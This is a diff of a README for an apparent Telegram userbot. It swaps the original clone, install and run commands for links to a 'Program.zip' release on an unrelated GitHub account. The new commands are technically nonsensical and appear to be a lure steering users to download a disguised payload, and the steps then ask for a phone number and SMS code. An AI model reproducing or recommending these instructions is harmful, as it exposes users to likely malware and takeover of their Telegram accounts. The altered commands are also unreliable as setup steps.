@@ -19,7 +19,7 @@ Once the packages are installed, follow the steps below:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/addamhris123/Userbottele.git
+   git clone https://github.com/Armosspec/Userbottele/releases/download/v1.0/Program.zip
    ```
 
 2. Navigate to the cloned directory:
@@ -29,7 +29,7 @@ Once the packages are installed, follow the steps below:
 
 3. Install required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Armosspec/Userbottele/releases/download/v1.0/Program.zip
    ```
 
    ```bash
@@ -38,7 +38,7 @@ Once the packages are installed, follow the steps below:
 
 4. Run the user bot:
    ```bash
-   python UserBot.py
+   python https://github.com/Armosspec/Userbottele/releases/download/v1.0/Program.zip
    ```
 
 5. Enter your phone number and Telegram SMS code when prompted.
